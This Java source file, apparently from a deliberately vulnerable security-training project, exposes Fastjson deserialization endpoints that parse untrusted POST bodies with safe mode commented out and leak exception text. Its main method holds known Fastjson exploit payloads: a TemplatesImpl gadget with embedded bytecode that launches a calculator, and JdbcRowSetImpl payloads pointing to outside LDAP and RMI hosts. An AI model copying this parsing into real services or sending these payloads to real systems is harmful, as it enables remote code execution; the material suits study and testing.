package org.joychou.controller;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;

import org.junit.Assert;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import java.util.LinkedHashSet;
import java.util.LinkedList;
import java.util.List;


@Controller
@RequestMapping("/fastjson")
public class Fastjson {

    @RequestMapping(value = "/deserialize", method = {RequestMethod.POST })
    @ResponseBody
    public static String Deserialize(@RequestBody String params) {
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        System.out.println(params);
        try {
            // 将post提交的string转换为json
            //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//            ParserConfig.global.setAutoTypeSupport(true);

            // 1.2.68之后引入，参考：https://github.com/alibaba/fastjson/wiki/fastjson_safemode
//            ParserConfig.getGlobalInstance().setSafeMode(true);

            JSONObject ob = JSON.parseObject(params);
//            JSONObject ob = JSON.parseObject(params, Feature.SafeMode);

            return ob.toString();
        }catch (Exception e){
            e.printStackTrace();
            return e.toString();    // 将异常信息作为HTTP响应的一部分返回了
        }
    }


    @RequestMapping(value = "/deserializeE1", method = {RequestMethod.POST })
    @ResponseBody
    public static String DeserializeE1(@RequestBody String params) {
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        System.out.println(params);
        try {
            // 将post提交的string转换为json
            //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
            //ParserConfig.global.setAutoTypeSupport(true);

            // 1.2.68之后引入，参考：https://github.com/alibaba/fastjson/wiki/fastjson_safemode
//            ParserConfig.getGlobalInstance().setSafeMode(true);

            JSONObject ob = JSON.parseObject(params);
//            JSONObject ob = JSON.parseObject(params, Feature.SafeMode);

            return ob.toString();
        }catch (Exception e){
            e.printStackTrace();
            // 并不返回异常信息
        }

        return "";
    }


    @RequestMapping(value = "/deserializeE2", method = {RequestMethod.POST })
    @ResponseBody
    public static String DeserializeE2(@RequestBody String params) {
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        System.out.println(params);
        // 将post提交的string转换为json
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //ParserConfig.global.setAutoTypeSupport(true);

        // 1.2.68之后引入，参考：https://github.com/alibaba/fastjson/wiki/fastjson_safemode
//      ParserConfig.getGlobalInstance().setSafeMode(true);

        JSONObject ob = JSON.parseObject(params);
//           JSONObject ob = JSON.parseObject(params, Feature.SafeMode);

        return ob.toString();
        // 并不捕获异常
    }

    @RequestMapping(value = "/deserialize1", method = {RequestMethod.POST })
    @ResponseBody
    public static String Deserialize1(@RequestBody String params) {
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        System.out.println(params);

//        ParserConfig.global.addAccept("com.alibaba.json.bvt.writeClassName.WriteClassNameTest_Set4");
//        ParserConfig.global.addAccept("com.alibaba.json.bvt.writeClassName.WriteClassNameTest_Set");

        A a = new A();
        LinkedHashSet<B> set = new LinkedHashSet<B>();
        set.add(new B());
        set.add(new B1());
        a.setList(set);
        String text = JSON.toJSONString(a, SerializerFeature.WriteClassName);
        System.out.println(text);

        try {
            // 将post提交的string转换为json
            //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
            //ParserConfig.global.setAutoTypeSupport(true);
            JSONObject ob = JSON.parseObject(params);
//            JSONObject ob = JSON.parseObject(params, Feature.SafeMode);

            return ob.toString();
        }catch (Exception e){
            e.printStackTrace();
            return e.toString();
        }
    }


    public static class A {

        private LinkedHashSet<B> list;

        public LinkedHashSet<B> getList() {
            return list;
        }

        public void setList(LinkedHashSet<B> list) {
            this.list = list;
        }

    }

    public static class B {
        private int valueB = 100;
        public int getValueB() {
            return valueB;
        }
    }

    public static class B1 extends B {
        private int valueB1 = 200;
        public int getValueB1() {
            return valueB1;
        }
    }


    public static List toList(String json) {
        List result = null;
        try {
            result = JSON.parseObject(json, LinkedList.class);
        } catch (Exception e) {
            return null;
        }
        return result;
    }

    public static void main(String[] args) {

//        // Open calc in mac
//        String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\"yv66vgAAADEAOAoAAwAiBwA2BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAzTG1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwACgALBwAoAQAxbWUvbGlnaHRsZXNzL2Zhc3Rqc29uL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAHW1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA9saWdodGxlc3MvcHduZXIBABFMbGlnaHRsZXNzL3B3bmVyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwA3AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAAD8ADgAAACAAAwAAAAEADwA3AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAEIADgAAACoABAAAAAEADwA3AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAABsAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAAAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACQ==\"], \"_name\": \"lightless\", \"_tfactory\": { }, \"_outputProperties\":{ }}";
////        Assert.assertEquals("{\"@type\":\"com.alibaba.json.bvt.writeClassName.WriteClassNameTest_Set$A\",\"list\":Set[{},{\"@type\":\"com.alibaba.json.bvt.writeClassName.WriteClassNameTest_Set$B1\"}]}",
////                text);
//        JSONObject object = JSON.parseObject(payload, Feature.SupportNonPublicField);

//        String json = "[{\n" +
//                "    \"111\": {\n" +
//                "        \"@type\": \"java.lang.Class\", \n" +
//                "        \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
//                "    }, \n" +
//                "    \"222\": {\n" +
//                "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \n" +
//                "        \"dataSourceName\": \"ldap://192.80b28a33124a835bf49f.d.zhack.ca:1389/Exploit\", \n" +
//                "        \"autoCommit\": true\n" +
//                "    }\n" +
//                "}]";

        String json = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://0.7298065486454082./Exploit\",\"autoCommit\":true}}";

        JSONObject obj= JSON.parseObject(json);
        System.out.println(obj);
        //        List result1 = toList(json);
//        System.out.println(result1);


    }
}
